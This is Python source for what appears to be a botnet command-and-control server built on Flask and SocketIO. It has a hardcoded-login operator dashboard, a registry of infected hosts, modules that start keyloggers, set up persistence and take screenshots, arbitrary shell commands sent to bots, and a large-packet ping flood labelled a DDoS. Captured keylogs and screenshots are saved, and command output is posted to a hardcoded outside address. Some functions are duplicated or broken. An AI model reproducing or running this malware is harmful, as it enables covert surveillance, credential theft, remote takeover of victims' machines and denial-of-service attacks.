from flask import Flask, request, render_template, redirect, url_for, session, jsonify
from flask_socketio import SocketIO
import keylogger, persistence, screenshot, subprocess, os, requests

app = Flask(__name__)
socketio = SocketIO(app)
app.secret_key = 'Fixer'

USERNAME = 'Leopard'
PASSWORD = 'leopard'
idNum = 0
database = []
completedTasks = []
screenshotNumber = 0
keyloggerNumber = 0
persistenceVariable = False

class TaskDone:
    def __init__(self, info):
        self.idNum = info['idNum']
        self.hostname = info['hostname']
        self.commandSent = info['commandSent']
        self.output = info['DATA']

class Client:
    def __init__(self, info):
        global idNum
        self.idNum = idNum
        idNum += 1
        self.persistence = False
        self.IP = info['IP']
        self.hostname = info['hostname']
        self.OS = info['OS']
        self.sid = info['sid']
        self.status = "Alive"

    def execute_command(self, command):
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output, error = process.communicate()
            output_str = output.decode('utf-8') if output else ""
            error_str = error.decode('utf-8') if error else ""
            if error_str:
                result = f"Error: {error_str}"
            else:
                result = f"Output: {output_str}"
            return result
        except Exception as e:
            return f"Error: {str(e)}"

@app.route('/')
def redirectLogin():
    return redirect(url_for('login'))

@app.route('/login.html', methods=['POST', 'GET'])
def login():
    if request.method == 'POST':
        username = request.form.get('userid')
        password = request.form.get('passid')
        if username == USERNAME and password == PASSWORD:
            session['loggedin'] = True
            session['username'] = USERNAME
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html')
    return render_template('login.html')

@app.route('/dashboard.html')
def dashboard():
    if session.get('loggedin'):
        return render_template('dashboard.html', database=database)
    return redirect(url_for('login'))

@app.route('/modules.html', methods=['GET', 'POST'])
def modules():
    if session.get('loggedin'):
        if request.method == 'POST':
            idNumber = request.form.get('idNumber')
            command = request.form.get('command')
            hostname = None
            client_info = next((client for client in database if client.idNum == int(idNumber)), None)

            if client_info:
                hostname = client_info.hostname

            if command == 'keylogger':
                keylogger_output = keylogger.start_keylogger()
                if keylogger_output:
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'KEYLOGGER',
                        'DATA': "Keylogger start Failed"
                    }))
                else:
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'KEYLOGGER',
                        'DATA': "Keylogger started"
                    }))
            elif command == 'persistence':
                try:
                    persistence_output = persistence.try_persistence()
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'PERSISTENCE',
                        'DATA': "Persistence command executed successfully"
                    }))
                except Exception as e:
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'PERSISTENCE',
                        'DATA': f"Error executing persistence command: {str(e)}"
                    }))
            elif command == 'screenshot':
                output_dir = r'./static/receivedData/screenshots/'
                screenshot_path = screenshot.take_screenshot(output_dir)
                if isinstance(screenshot_path, str):
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'SCREENSHOT',
                        'DATA': f"Screenshot taken and saved at: {screenshot_path}"
                    }))
                else:
                    completedTasks.append(TaskDone({
                        'idNum': idNumber,
                        'hostname': hostname,
                        'commandSent': 'SCREENSHOT',
                        'DATA': f"Error Taking Screenshot: {screenshot_path}"
                    }))
        return render_template('modules.html', taskDb=completedTasks)
    return redirect(url_for('login'))

@app.route('/commands.html', methods=['GET', 'POST'])
@app.route('/commands', methods=['GET', 'POST'])
def commands():
    if request.method == 'POST':
        user_command = request.json.get('command')
        bot_id = request.json.get('botId')
        output = execute_command_on_bot(bot_id, user_command)
        return jsonify(output=output)
    elif request.method == 'GET':
        output = request.args.get('output')
        return render_template('commands.html', output=output)

def execute_command_on_bot(bot_id, command):
    client = next((c for c in database if c.idNum == int(bot_id)), None)
    if not client:
        return f"Error: Bot with ID {bot_id} not found"
    try:
        result = client.execute_command(command)
        return result
    except Exception as e:
        return f"Error: {str(e)}"

def receive_output():
    output = request.json.get('output')
    print("Received output:", output.stdout)
    return "Output received successfully", 200

def receive_output(output):
    data = {"output": output}
    try:
        response = requests.post("http://192.168.100.222/executecommands", json=data)
        if response.status_code == 200:
            print("Output sent successfully.")
        else:
            print("Failed to send output. Status code:", response.status_code)
    except Exception as e:
        print("Error:", e)

@app.route('/ping.html', methods=['GET', 'POST'])
def ping():
    if request.method == 'POST':
        ip_address = request.form.get('target_ip')
        output = run_ping(ip_address)
        return render_template('ping.html', output=output)
    return render_template('ping.html')

def run_ping(ip_address):
    try:
        command = f'ping {ip_address} -t -l 65500'
        output = {}
        for client in database:
            subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            output[client.idNum] = {
                'hostname': client.hostname,
                'status': 'Ping command sent successfully'
            }
        return output
    except Exception as e:
        return f"Error sending DDoS Ping command to all bots: {str(e)}"

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@socketio.on('connect')
def onConnect():
    pass

@socketio.on('message')
def handleMessage(message):
    command = message.get('COMMAND')
    if command == 'INFO':
        database.append(Client(message))
    elif command == 'OUTPUT':
        if 'persistence' in message['commandSent']:
            if message['PV']:
                for x in database:
                    if x.idNum == message['idNum']:
                        x.persistence = True

            if "screenshot" in message['commandSent']:
                global screenshotNumber
                with open(f'./static/receivedData/screenshots/screenshot_{screenshotNumber}.png', 'wb') as f:
                    f.write(message['DATA'])
                    tmp = f'/static/receivedData/screenshots/screenshot_{screenshotNumber}.png'
                    message['DATA'] = tmp
                    screenshotNumber += 1

            if 'keylogger' in message['commandSent']:
                global keyloggerNumber
                with open(f'./static/receivedData/keylogs/keylogs_{keyloggerNumber}.txt', 'w') as f:
                    f.write(message['DATA'])
                    tmp = f'/static/receivedData/keylogs/keylogs_{keyloggerNumber}.txt'
                    message['DATA'] = tmp
                    keyloggerNumber += 1

            completedTasks.append(TaskDone(message))
    elif command == 'status update':
        for c in database:
            if c.idNum == message['idNum']:
                c.status = "Dead"

if __name__ == '__main__':
    app.config['UPLOAD_FOLDER'] = 'output_files'
    if not os.path.exists(app.config['UPLOAD_FOLDER']):
        os.makedirs(app.config['UPLOAD_FOLDER'])
    socketio.run(app, host='0.0.0.0')
